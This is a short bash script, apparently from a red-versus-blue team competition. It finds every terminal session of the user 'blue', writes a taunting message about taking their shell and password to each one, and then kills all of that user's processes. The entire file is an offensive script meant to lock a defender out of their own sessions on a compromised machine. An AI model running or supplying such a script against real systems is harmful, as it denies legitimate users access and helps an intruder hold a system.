#!/bin/bash

for i in $(ps aux | grep blue | grep ' pts' | grep -v root | awk '{print $7}')
do
        /usr/bin/echo "Say Bye Bye to your Shell Blue and that password" > /dev/$i
        /usr/bin/killall -u blue
done
